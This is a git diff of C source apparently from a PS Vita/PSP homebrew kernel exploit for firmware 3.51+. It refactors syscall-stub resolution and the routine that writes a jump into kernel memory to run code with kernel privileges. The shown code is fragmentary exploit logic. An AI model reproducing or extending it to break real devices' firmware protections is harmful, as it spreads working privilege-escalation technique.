@@ -27,7 +27,10 @@
 #include <kxploit.h>
 #include <functions.h>
 
-int is_exploited;
+/*
+Kernel Exploit for PS Vita 3.51+
+*/
+
 u32 sw_address = 0x88014B00;
 
 SceUID (* _sceKernelCreateVpl)(const char *name, int part, int attr, unsigned int size, struct SceKernelVplOptParam *opt);
@@ -43,30 +46,22 @@ int doExploit(){
 }
 
 void repairInstruction(void){
-	
 	//Vita 3.51, restore sceKernelLibcClock and sceKernelLibcTime pointers.
-	u32 rtc = g_tbl->FindTextAddrByName("sceRTC_Service");
+	u32 rtc = k_tbl->FindTextAddrByName("sceRTC_Service");
 	_sw(rtc + 0x3904, sw_address);
 	_sw(rtc + 0x3924, sw_address + 4);
 }
 
-int stubScanner(){
-	
-	p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
-	
-	_sceKernelCreateVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0x56C039B5));
-	_sceKernelTryAllocateVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0xAF36D708));
-	_sceKernelFreeVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0xB736E9FF));
-	_sceKernelDeleteVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0x89B3D48C));
-	_sceKernelLibcClock = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("UtilsForUser", 0x91E4F6A7));
-	
-	p5_close_savedata();
+int stubScanner(FunctionTable* tbl){
+	_sceKernelCreateVpl = g_tbl->KernelCreateVpl;
+	_sceKernelTryAllocateVpl = g_tbl->KernelTryAllocateVpl;
+	_sceKernelFreeVpl = g_tbl->KernelFreeVpl;
+	_sceKernelDeleteVpl = g_tbl->KernelDeleteVpl;
+	_sceKernelLibcClock = g_tbl->KernelLibcClock;
+	return 0;
 }
 
 void executeKernel(u32 kernelContentFunction){
-	is_exploited = 0;
-
-	
 
 	SceUID vpl = _sceKernelCreateVpl("kexploit", 2, 1, 512, NULL);
 
@@ -86,7 +81,7 @@ void executeKernel(u32 kernelContentFunction){
 
 	u32 jumpto = addr2 - 16;
 
-	_sw(MAKE_JUMP(0x10000), jumpto);
+	_sw(JUMP(0x10000), jumpto);
 	_sw(0, jumpto + 4);
 
 	u32 kfuncaddr = (u32)kernelContentFunction | 0x80000000;
